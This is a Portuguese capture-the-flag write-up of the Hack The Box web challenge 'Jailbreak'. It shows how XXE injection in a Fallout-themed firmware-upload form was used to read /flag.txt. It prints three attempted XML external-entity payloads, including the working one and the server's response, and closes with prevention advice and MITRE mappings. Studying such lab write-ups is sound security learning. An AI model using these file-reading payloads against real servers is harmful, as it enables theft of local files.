---
title: "Jailbreak"
platform: "Hack The Box"
category: "Web"
difficulty: "Very Easy"
date: 2025-08-15
techniques: ["XXE Injection", "Local File Inclusion", "XML Parsing"]
description: "Injeção XXE em um uploader de firmware ROM tematizado em Pip-Boy (Fallout), leitura do /flag.txt no filesystem do servidor via entidades XML externas."
lang: pt-br
translation_key: jailbreak
permalink: /writeups/jailbreak/pt/
---

| Info | Detalhe |
|------|---------|
| Plataforma | Hack The Box |
| Categoria | Web / XXE |
| Dificuldade | Very Easy |
| Flag | `HTB{bi0m3tric_l0cks_4nd_fl1cker1ng_lights_...}` |

---

## Visão Geral

Uma interface estilo Pip-Boy (tematizada em Fallout) com várias abas. A aba ROM aceita entrada XML para "atualizações de firmware". A flag está armazenada em `/flag.txt` no filesystem do servidor.

## Reconhecimento

Explorei todas as abas da aplicação. A aba **ROM** revelou uma página de "Firmware Update" com:
- Uma textarea aceitando entrada XML
- Um botão Submit
- Uma estrutura XML de exemplo com schema `<FirmwareUpdateConfig>`

```bash
curl http://TARGET:PORT/flag.txt
# {"error": "Not Found"} — não acessível via web, mas existe no filesystem
```

## Vulnerabilidade: XXE Injection

O servidor faz parsing do XML enviado pelo usuário sem desabilitar entidades externas. Isso permite definir uma entidade customizada que lê arquivos locais.

## Exploração

### Tentativa 1. Com declaração de encoding
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
...
```
**Resultado:** Servidor rejeitou a declaração de encoding.

### Tentativa 2. Entidade no campo Description
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
  <Firmware>
    <Description>&xxe;</Description>
    ...
```
**Resultado:** Sem retorno, o campo Description não é refletido na resposta.

### Tentativa 3. Entidade em múltiplos campos (SUCESSO)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
    <Description>test</Description>
    <Checksum type="SHA-256">test</Checksum>
  </Firmware>
  <Components>
    <Component name="navigation">
      <Version>&xxe;</Version>
      <Description>&xxe;</Description>
      <Checksum type="SHA-256">&xxe;</Checksum>
    </Component>
  </Components>
  <UpdateURL>&xxe;</UpdateURL>
</FirmwareUpdateConfig>
```

**Resultado:** `Firmware version HTB{bi0m3tric_l0cks_4nd_fl1cker1ng_lights_...} update initiated.`

O campo **Version** foi refletido na mensagem de resposta do servidor.

## Principais Aprendizados

- **Entrada XML = testar XXE**, é quase um reflexo em segurança web
- **Nem todo campo reflete saída**, testar `&xxe;` em vários campos simultaneamente
- **Remover a declaração `<?xml?>`** se o servidor rejeitar
- **`SYSTEM "file:///"` lê arquivos locais** através do parser XML
- Prevenção: desabilitar DTDs e entidades externas no parser XML

## MITRE ATT&CK

| Tática | Técnica | ID |
|--------|---------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Collection | Data from Local System | T1005 |

**OWASP:** A05:2021 – Security Misconfiguration
